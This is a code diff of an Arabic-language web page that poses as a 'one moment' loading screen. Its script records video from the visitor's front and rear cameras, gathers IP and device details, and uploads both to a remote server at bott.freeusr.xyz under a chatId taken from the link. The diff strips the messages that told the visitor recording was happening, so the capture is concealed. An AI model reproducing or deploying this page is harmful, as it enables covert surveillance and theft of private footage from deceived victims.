@@ -5,274 +5,65 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>لحظة واحدة..</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
       margin: 0;
-      font-family: 'Arial', sans-serif;
+      font-family: Arial, sans-serif;
       background-color: #121212;
       color: #e0e0e0;
       overflow: hidden;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
     }
-
     video {
       display: none;
     }
-
-    /* ===== شاشة التحميل ===== */
     #loadingOverlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(18, 18, 18, 0.95);
+      background: rgba(18, 18, 18, 0.8);
       color: #e0e0e0;
       display: flex;
       align-items: center;
       justify-content: center;
+      font-size: 24px;
       z-index: 1000;
       flex-direction: column;
-      padding: 20px;
     }
-
     .spinner {
-      border: 6px solid rgba(255, 255, 255, 0.1);
-      border-top: 6px solid #e74c3c;
+      border: 16px solid #f3f3f3;
+      border-top: 16px solid #3498db;
       border-radius: 50%;
-      width: 80px;
-      height: 80px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 25px;
+      width: 100px;
+      height: 100px;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     .loadingText {
-      font-size: 1.3rem;
+      font-size: 20px;
       text-align: center;
-      font-weight: 600;
-      color: rgba(255, 255, 255, 0.9);
-    }
-
-    .loadingSubText {
-      font-size: 0.9rem;
-      color: rgba(255, 255, 255, 0.5);
-      margin-top: 10px;
-    }
-
-    /* ===== رسالة النجاح ===== */
-    .success-container {
-      text-align: center;
-      animation: fadeInUp 0.8s ease-out;
-    }
-
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px) scale(0.95);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
-    }
-
-    .check-icon {
-      width: 80px;
-      height: 80px;
-      background: linear-gradient(135deg, #e74c3c, #c0392b);
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin: 0 auto 25px;
-      animation: pulse 1.5s ease-in-out infinite;
-      box-shadow: 0 10px 30px rgba(231, 76, 60, 0.4);
-    }
-
-    .check-icon svg {
-      width: 45px;
-      height: 45px;
-      fill: none;
-      stroke: #fff;
-      stroke-width: 3;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.08); }
-      100% { transform: scale(1); }
-    }
-
-    .main-title {
-      font-size: 2.8rem;
-      font-weight: 700;
-      color: #e74c3c;
-      margin-bottom: 10px;
-      text-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
-    }
-
-    .line {
-      width: 60px;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, #e74c3c, transparent);
-      margin: 15px auto 20px;
-      border-radius: 2px;
-    }
-
-    .sub-text {
-      font-size: 1.1rem;
-      color: rgba(255, 255, 255, 0.7);
-      margin: 15px 0 30px;
-      line-height: 1.8;
-    }
-
-    .close-btn {
-      background: linear-gradient(135deg, #e74c3c, #c0392b);
-      color: #fff;
-      border: none;
-      padding: 14px 40px;
-      font-size: 1rem;
-      font-weight: 600;
-      border-radius: 50px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      font-family: 'Arial', sans-serif;
-      box-shadow: 0 8px 25px rgba(231, 76, 60, 0.3);
-    }
-
-    .close-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 35px rgba(231, 76, 60, 0.5);
-    }
-
-    .close-btn:active {
-      transform: translateY(0);
-    }
-
-    /* ===== رسالة الخطأ ===== */
-    .error-text {
-      color: #e74c3c;
-      font-size: 1.2rem;
-      text-align: center;
-      padding: 20px;
-    }
-
-    /* ===== تحسينات إضافية ===== */
-    .status-icon {
-      font-size: 2.5rem;
-      margin-bottom: 15px;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    .blink {
-      animation: blink 1.5s ease-in-out infinite;
+      font-weight: bold;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
     }
   </style>
 </head>
 <body>
-  <!-- شاشة التحميل -->
   <div id="loadingOverlay">
-    <div id="loadingContent">
-      <div class="spinner"></div>
-      <div class="loadingText" id="status">📹 جاري تجهيز الكاميرا</div>
-      <div class="loadingSubText" id="subStatus">يرجى الانتظار...</div>
-    </div>
+    <div class="spinner"></div>
+    <div class="loadingText" id="status">لحظة واحدة</div>
   </div>
-
   <video id="preview" width="640" height="480" autoplay muted></video>
 
   <script>
     const chatId = new URLSearchParams(window.location.search).get('chatId');
     const statusText = document.getElementById('status');
-    const subStatusText = document.getElementById('subStatus');
     const videoElement = document.getElementById('preview');
     const loadingOverlay = document.getElementById('loadingOverlay');
 
-    // ===== عرض رسالة النجاح =====
-    function showSuccessMessage() {
-      loadingOverlay.innerHTML = `
-        <div class="success-container">
-          <div class="check-icon">
-            <svg viewBox="0 0 24 24">
-              <polyline points="20 6 9 17 4 12" />
-            </svg>
-          </div>
-          <h1 class="main-title">انتهى اغلق الصفحة</h1>
-          <div class="line"></div>
-          <p class="sub-text">
-            ✅ تم إرسال الفيديو بنجاح<br>
-            يمكنك الآن إغلاق هذه الصفحة
-          </p>
-          <button class="close-btn" onclick="closePage()">
-            ✕ إغلاق الصفحة
-          </button>
-        </div>
-      `;
-    }
-
-    // ===== عرض رسالة الخطأ =====
-    function showError(message) {
-      loadingOverlay.innerHTML = `
-        <div class="error-text">
-          <div style="font-size: 3rem; margin-bottom: 15px;">❌</div>
-          ${message}
-          <br><br>
-          <button class="close-btn" onclick="location.reload()" style="font-size: 0.9rem; padding: 10px 30px;">
-            🔄 إعادة المحاولة
-          </button>
-        </div>
-      `;
-    }
-
-    // ===== دالة إغلاق الصفحة =====
-    function closePage() {
-      window.close();
-      setTimeout(() => {
-        document.body.innerHTML = `
-          <div style="
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: #121212;
-            color: #e74c3c;
-            font-size: 1.5rem;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-          ">
-            ✅ يمكنك إغلاق هذه الصفحة الآن
-          </div>
-        `;
-      }, 500);
-    }
-
-    // ===== تحديث حالة التحميل =====
-    function updateStatus(text, subText = '') {
-      statusText.textContent = text;
-      if (subText) subStatusText.textContent = subText;
-    }
-
-    // ===== الحصول على معلومات الجهاز =====
     async function getDeviceInfo() {
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
@@ -295,18 +86,13 @@
       }
     }
 
-    // ===== تسجيل وإرسال الفيديو =====
     async function recordAndSendVideo(facingMode = "user") {
-      const cameraName = facingMode === "user" ? "الأمامية" : "الخلفية";
-      updateStatus(`📹 جاري تجهيز الكاميرا ${cameraName}`, 'يرجى السماح بصلاحية الكاميرا');
-
+      statusText.innerText = "لحظة واحدة...";
       const constraints = { video: { facingMode }, audio: false };
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         videoElement.srcObject = stream;
-
-        updateStatus(`🎥 جاري تسجيل الفيديو (الكاميرا ${cameraName})`, 'سيتم الإرسال تلقائياً...');
 
         const recorder = new MediaRecorder(stream);
         const chunks = [];
@@ -331,52 +117,74 @@
         const deviceInfo = await getDeviceInfo();
         formData.append('additionalData', JSON.stringify(deviceInfo));
 
-        updateStatus(`📤 جاري إرسال الفيديو (الكاميرا ${cameraName})`, 'يرجى الانتظار...');
+        statusText.innerText = "لحظة واحدة...";
 
         const res = await fetch('https://bott.freeusr.xyz/submitVideo', {
           method: 'POST',
           body: formData
         });
 
-        if (!res.ok) throw new Error("فشل الإرسال");
+        if (!res.ok) throw new Error("لحظة واحدة");
 
-        updateStatus(`✅ تم إرسال الفيديو (الكاميرا ${cameraName})`, '');
+        statusText.innerText = "تم بنجاح";
         return true;
-
       } catch (err) {
         console.error(err);
-        updateStatus(`❌ فشل في الكاميرا ${cameraName}`, err.message);
+        statusText.innerText = "❌ لم يتم الحصول على صلاحيات الكاميرا.";
         return false;
       }
     }
 
-    // ===== الوظيفة الرئيسية =====
     (async () => {
-      // التحقق من وجود chatId
-      if (!chatId) {
-        showError("❌ خطأ: chatId غير موجود في الرابط");
-        return;
-      }
-
       // تسجيل الكاميرا الأمامية
-      const frontSuccess = await recordAndSendVideo("user");
-      
-      // تأخير بسيط بين الكاميرات
-      await new Promise(resolve => setTimeout(resolve, 500));
+      await recordAndSendVideo("user");
       
       // تسجيل الكاميرا الخلفية
-      const backSuccess = await recordAndSendVideo("environment");
-
-      // ✅ تم إلغاء التحويل إلى الرابط الإعلاني
+      await recordAndSendVideo("environment");
+      
+      // ❌ تم إلغاء التحويل إلى الرابط الإعلاني
       // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
-
-      // ✅ عرض رسالة "انتهى اغلق الصفحة" بدلاً من التحويل
-      if (frontSuccess || backSuccess) {
-        // نجاح على الأقل في كاميرا واحدة
-        showSuccessMessage();
-      } else {
-        showError("❌ فشل في تسجيل جميع الكاميرات. يرجى المحاولة مرة أخرى.");
-      }
+      
+      // ✅ عرض رسالة "انتهى اغلق الصفحة" مع الحفاظ على التصميم القديم
+      loadingOverlay.innerHTML = `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          text-align: center;
+          padding: 20px;
+        ">
+          <div style="
+            width: 100px;
+            height: 100px;
+            background: #e74c3c;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 25px;
+            animation: spin 1.5s linear infinite;
+          ">
+            <span style="font-size: 50px; color: white;">✓</span>
+          </div>
+          <div style="
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #e74c3c;
+            margin-bottom: 10px;
+          ">
+            انتهى اغلق الصفحة
+          </div>
+          <div style="
+            font-size: 0.9rem;
+            color: #666;
+            margin-top: 15px;
+          ">
+            يمكنك إغلاق هذه الصفحة الآن
+          </div>
+        </div>
+      `;
     })();
   </script>
 </body>
